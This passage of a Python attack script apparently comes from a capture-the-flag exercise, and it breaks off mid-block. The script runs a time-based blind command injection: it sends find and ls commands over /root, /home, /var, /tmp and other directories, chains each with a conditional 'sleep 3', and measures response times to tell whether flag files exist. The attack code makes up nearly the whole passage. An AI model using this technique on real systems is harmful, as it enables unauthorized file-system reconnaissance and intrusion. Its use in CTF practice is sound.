    "/var/flag.txt"
]

# Also use find to discover flag files
print("\n[STEP 2] Discovering flag files with find command")

# Use find with time-based test to detect if files exist
find_commands = [
    "find / -name '*flag*' -type f 2>/dev/null",
    "find /tmp -name '*flag*' -type f 2>/dev/null", 
    "find /app -name '*flag*' -type f 2>/dev/null",
    "find /home -name '*flag*' -type f 2>/dev/null",
    "find /root -name '*flag*' -type f 2>/dev/null 2>&1",
    "find /var -name '*flag*' -type f 2>/dev/null",
    "find /opt -name '*flag*' -type f 2>/dev/null",
    "ls -la / | grep -i flag",
    "ls -la /tmp | grep -i flag",
    "ls -la /app | grep -i flag"
]

# Test each find command to see if it produces any delay differences
executed_findings = []

for find_cmd in find_commands:
    print(f"\n[*] Testing: {find_cmd}")
    
    # Method: Execute find and pipe to wc -l, then conditionally sleep if lines found
    test_cmd = f"{find_cmd} | wc -l | grep -v '^0$' && sleep 3"
    elapsed = test_command(test_cmd)
    
    print(f"  Response time: {elapsed:.2f}s")
    
    if elapsed >= 2.5:
        print(f"  [+] Found something with: {find_cmd}")
        executed_findings.append(find_cmd)

# Check common direct paths
print("\n[STEP 3] Checking direct file paths")

for filepath in potential_flag_files[:8]:  # Check first 8 most common
    print(f"\n[*] Checking existence of: {filepath}")
    
    if check_file_exists(filepath):
